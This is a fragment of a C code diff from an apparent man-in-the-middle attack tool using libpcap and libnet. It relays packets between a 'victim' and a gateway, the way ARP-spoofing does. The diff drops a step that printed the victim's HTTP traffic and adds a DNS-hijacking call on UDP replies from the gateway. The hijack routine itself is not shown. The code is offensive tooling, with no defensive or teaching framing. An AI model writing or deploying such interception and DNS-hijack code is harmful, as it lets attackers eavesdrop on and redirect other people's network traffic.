@@ -36,7 +36,7 @@ int forward(char *dev, u_short pro_type, u_char *DST, u_char *SRC, const u_char 
     for (int i = 0; i < Times; i++) {
         res = libnet_write(net_t);
         if (res == -1) {
-            printf("IP libnet write error\n");
+            //printf("IP libnet write error\n");
             libnet_destroy(net_t);
             return 1;
         }
@@ -63,16 +63,14 @@ void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) 
     /* get packet information */
     ethernet_header *pEther = (ethernet_header *)packet;
     ip_header *pIpv4 = (ip_header *)(packet + 14);
-    tcp_header *pTcp = (tcp_header *)(packet + 34);
-    char *data = (char *)(packet + 54);
 
     /* get packet form victim */
     if (!memcmp(pEther->SRC_mac, victim_mac, 6)) {
-        char *p = strstr(data, "HTTP");
-        if (p != NULL) printf("%s\n", data);
         forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
     }
     else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
+        if (pIpv4->protocol_type == PROTOCOL_UDP)
+            DnshijackG(packet + 42, hp->len - 42);
         forward(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
     }
 }
